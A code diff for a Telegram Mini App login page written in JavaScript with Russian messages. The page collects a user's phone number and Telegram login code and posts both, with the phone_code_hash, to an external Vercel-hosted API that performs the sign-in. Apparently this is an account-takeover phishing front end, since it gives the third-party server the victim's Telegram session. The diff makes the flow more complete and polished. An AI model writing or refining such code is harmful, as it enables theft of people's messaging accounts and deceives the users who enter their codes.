@@ -1,12 +1,11 @@
-// Очень упрощённый пример, в реальности добавляют больше проверок
-
 const tg = window.Telegram.WebApp;
 tg.ready();
 tg.expand();
 
-const API_BASE = "https://telegram-api-ashen.vercel.app/api";  // ← сюда реальный адрес
+const API_BASE = "https://telegram-api-ashen.vercel.app/api";
 
 let currentPhone = "";
+let phoneCodeHash = "";
 
 const phoneInput = document.getElementById("phone");
 const btnNext = document.getElementById("btn-next");
@@ -16,13 +15,20 @@ const btnSubmit = document.getElementById("btn-submit");
 
 let code = "";
 
-// Переключение шагов
 function showStep(id) {
   document.querySelectorAll(".step").forEach(el => el.classList.remove("active"));
   document.getElementById(id).classList.add("active");
 }
 
-// Автофокус и переход между полями кода
+// Автоформатирование номера телефона
+phoneInput.addEventListener("input", function(e) {
+  let value = this.value.replace(/\D/g, "");
+  if (!value.startsWith("+")) {
+    value = "+" + value;
+  }
+  this.value = value;
+});
+
 codeInputs.forEach((input, idx) => {
   input.addEventListener("input", e => {
     const val = e.target.value.replace(/\D/, "");
@@ -41,21 +47,19 @@ codeInputs.forEach((input, idx) => {
   });
 });
 
-// Шаг 1 — запрос кода
 btnNext.onclick = async () => {
   const phone = phoneInput.value.trim();
   if (!phone.startsWith("+") || phone.length < 10) {
-    alert("Введите корректный номер");
+    alert("Введите корректный номер телефона");
     return;
   }
 
   currentPhone = phone;
   phoneDisplay.textContent = phone;
-
   showStep("loading");
 
   try {
-    const r = await fetch(`${API_BASE}/request_code`, {
+    const response = await fetch(`${API_BASE}/request_code`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
@@ -64,27 +68,36 @@ btnNext.onclick = async () => {
       body: JSON.stringify({ phone })
     });
 
-    const data = await r.json();
-
+    const data = await response.json();
+    
     if (data.ok) {
+      phoneCodeHash = data.phone_code_hash;
       showStep("step-code");
       codeInputs[0].focus();
+      codeInputs.forEach(input => input.value = "");
+      code = "";
+      btnSubmit.disabled = true;
     } else {
-      alert(data.error || "Ошибка запроса кода");
+      alert(data.error || "Не удалось отправить код");
       showStep("step-phone");
     }
   } catch (err) {
-    alert("Ошибка сети");
+    console.error(err);
+    alert("Ошибка сети. Проверьте подключение к интернету");
     showStep("step-phone");
   }
 };
 
-// Шаг 2 — отправка кода
 btnSubmit.onclick = async () => {
+  if (code.length !== 5) {
+    alert("Введите полный 5-значный код");
+    return;
+  }
+
   showStep("loading");
 
   try {
-    const r = await fetch(`${API_BASE}/sign_in`, {
+    const response = await fetch(`${API_BASE}/sign_in`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
@@ -92,24 +105,60 @@ btnSubmit.onclick = async () => {
       },
       body: JSON.stringify({
         phone: currentPhone,
-        code: code
+        code: code,
+        phone_code_hash: phoneCodeHash
       })
     });
 
-    const data = await r.json();
+    const data = await response.json();
 
     if (data.ok) {
       showStep("success");
-      // Можно отправить данные дальше куда нужно
       console.log("Успешный вход:", data.user);
+      
+      // Отправляем данные в WebApp
+      if (tg.sendData) {
+        tg.sendData(JSON.stringify({
+          action: "auth_success",
+          user: data.user
+        }));
+      }
+      
+      // Закрываем WebApp через 2 секунды
+      setTimeout(() => {
+        if (tg.close) tg.close();
+      }, 2000);
     } else {
-      alert(data.error || "Неверный код");
+      alert(data.error || "Ошибка входа. Проверьте код и попробуйте снова");
       showStep("step-code");
+      codeInputs.forEach(input => input.value = "");
+      code = "";
+      btnSubmit.disabled = true;
+      codeInputs[0].focus();
     }
   } catch (err) {
-    alert("Ошибка сети");
+    console.error(err);
+    alert("Ошибка сети. Проверьте подключение к интернету");
     showStep("step-code");
   }
 };
 
+// Инициализация
 showStep("step-phone");
+phoneInput.focus();
+
+// Обработка нажатия Enter в поле телефона
+phoneInput.addEventListener("keypress", (e) => {
+  if (e.key === "Enter") {
+    btnNext.click();
+  }
+});
+
+// Обработка нажатия Enter в поле кода
+codeInputs.forEach((input, idx) => {
+  input.addEventListener("keypress", (e) => {
+    if (e.key === "Enter" && idx === 4 && code.length === 5) {
+      btnSubmit.click();
+    }
+  });
+});
